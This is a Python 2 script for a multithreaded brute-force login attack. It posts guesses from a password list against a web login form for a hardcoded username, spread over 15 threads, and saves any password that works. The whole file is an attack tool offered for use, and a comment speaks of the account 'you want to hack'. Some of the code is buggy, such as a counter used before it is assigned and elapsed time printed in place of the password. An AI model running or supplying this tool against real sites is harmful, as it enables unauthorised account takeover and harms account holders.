from threading import Thread
import time
import requests

print "\n#####################################"
print "# => Brute Force Login <=           #"
print "# Custom multithreading from        #"
print "# Sanix-Darker                      #"
print "#####################################"

start_time = time.time()
success=0
# The link of the website
url = raw_input("\nEnter URL:")
# The userfield in the form of the login
userField = raw_input("\nEnter the User Field:")
# The passwordfield in the form
passwordField = raw_input("\nEnter the Password field:")
# list of potential incorrect message in the page if it doesn't succeed
incorrectMessage = ['incorrect', 'required error']
# list of potential success message in the page if it succeed
successMessage = ['success', 'SUCCESS']

# Getting list of potentials password
passwords = open('passwords.txt').readlines()
# Getting list of user to test with
users = open('users.txt').readlines()


print "Connecting to: "+url+"......\n"
# Put the target email you want to hack
#user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
failed_aftertry = 0

class myThread(Thread):
    def __init__(self, name, index, des):
        super(myThread, self).__init__()
        self.name =name
        self.index = index
        self.des = des
    def run(self):
        for i in range(self.index,self.des):
            dados = {userField: "quanghnn".replace('\n', ''), passwordField: passwords[i].replace('\n', '')}
            print dados , passwords[i] ,"\n"

        # Doing the post form
            data = requests.post(url, data=dados)
        #print data.text
            if "404 - Not Found" in data.text:
                if failed_aftertry > 5:
                    print "Connexion failed : Trying again ...."
                    break
                else:
                    failed_aftertry = failed_aftertry+1
                    print "Connexion failed : 404 Not Found (Verify your link)"
            else:
            # if you want to see the text result decomment this
            #print data.text
                if incorrectMessage[0] in data.text or incorrectMessage[1] in data.text:
                    print "Failed to connect with:\n user: "+"quanghnn"+" and password: "+passwords[i]
                
                    #dd= myThread("thread 1aa", self.index,self.des)
                    #dd.start()
                else:
                    if successMessage[0] in data.text or successMessage[1] in data.text:
                        print "\n#######################################"
                        print "\nYOUPIII!! \nTheese Credentials succeed:\n> user: "+"quanghnn"+" and password: "+ str((time.time() - start_time))
                        print "#######################################"
                        stop=time.time() - start_time
                        print stop
                        f44 =open("Success","w")
                        f44.write(passwords[i]+str(time.time() - start_time))
                        f44.close()

                        break
                
                    else:
                        print "Trying theese parameters: user: "+"quanghnn"+" and password: "+passwords[i]+ str(i)
                        stop=time.time() - start_time
                        print stop
      

d= myThread("thread 1", 0,len(passwords)/15)
d1= myThread("thread 2", len(passwords)/15,(len(passwords)*2)/15)
d2= myThread("thread 3", (len(passwords)*2)/15,(len(passwords)*3)/15)
d3= myThread("thread 4", (len(passwords)*3)/15,(len(passwords)*4)/15)
d4= myThread("thread 5", (len(passwords)*4)/15,(len(passwords)*5)/15)
d5= myThread("thread 6", (len(passwords)*5)/15,(len(passwords)*6)/15)
d6= myThread("thread 7", (len(passwords)*6)/15,(len(passwords)*7)/15)
d7= myThread("thread 8", (len(passwords)*7)/15,(len(passwords)*8)/15)
d8= myThread("thread 9", (len(passwords)*8)/15,(len(passwords)*9)/15)
d9= myThread("thread 10", (len(passwords)*9)/15,(len(passwords)*10)/15)
d10= myThread("thread 11", (len(passwords)*10)/15,(len(passwords)*11)/15)
d11= myThread("thread 12", (len(passwords)*11)/15,(len(passwords)*12)/15)
d12= myThread("thread 13", (len(passwords)*12)/15,(len(passwords)*13)/15)
d13= myThread("thread 14", (len(passwords)*13)/15,(len(passwords)*14)/15)
d14= myThread("thread 15", (len(passwords)*14)/15,(len(passwords)*15)/15)

d.start()
d1.start()
d2.start()
d3.start()
d4.start()
d5.start()
d6.start()
d7.start()
d8.start()
d9.start()
d10.start()
d11.start()
d12.start()
d13.start()
d14.start()
Just_to_pause_the_script = raw_input("\n.")
